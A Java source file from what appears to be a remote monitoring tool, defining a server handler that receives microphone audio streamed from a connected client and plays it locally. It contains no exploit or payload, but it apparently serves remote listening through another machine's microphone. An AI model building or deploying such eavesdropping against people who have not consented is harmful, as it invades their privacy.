package me.jershdervis.monitorj.server.packets;

import me.jershdervis.monitorj.server.BaseServerClient;
import me.jershdervis.monitorj.server.PacketTask;
import me.jershdervis.monitorj.server.Packets;

import javax.sound.sampled.*;
import java.io.ByteArrayInputStream;
import java.io.EOFException;
import java.io.IOException;

/**
 * Created by Josh on 16/07/2015.
 */
public class RemoteMicSample extends PacketTask {

    private float sampleRate = 16000.0F;
    private int sampleSizeBits = 16;
    private int channels = 1;
    private boolean signed = true;
    private boolean bigEndian = false;

    private AudioFormat audioFormat;
    private DataLine.Info micInfo;
    private SourceDataLine sourceDataLine; //Close when packet sent to stop remote mic?

    public RemoteMicSample() {
        super(Packets.REMOTE_MIC_SAMPLE.getPacketID());

        try
        {
            this.audioFormat = new AudioFormat(this.sampleRate, this.sampleSizeBits, this.channels, this.signed, this.bigEndian);
            this.micInfo = new DataLine.Info(SourceDataLine.class, audioFormat);
            this.sourceDataLine = ((SourceDataLine) AudioSystem.getLine(micInfo));
            this.sourceDataLine.open(audioFormat);
            this.sourceDataLine.start();
        } catch (LineUnavailableException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void run(BaseServerClient client) throws IOException {
        int length = client.getDataInputStream().readInt();
        byte[] data = new byte[length];

        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        AudioInputStream ais = new AudioInputStream(bais, audioFormat, data.length);

        int read = 0;
        while (read < length) {
            int j = client.getDataInputStream().read(data, read, length - read);
            if (j < 0) {
                throw new EOFException();
            }
            read += j;
        }
        if((read = ais.read(data)) != -1)
            this.sourceDataLine.write(data, 0, read);
    }
}
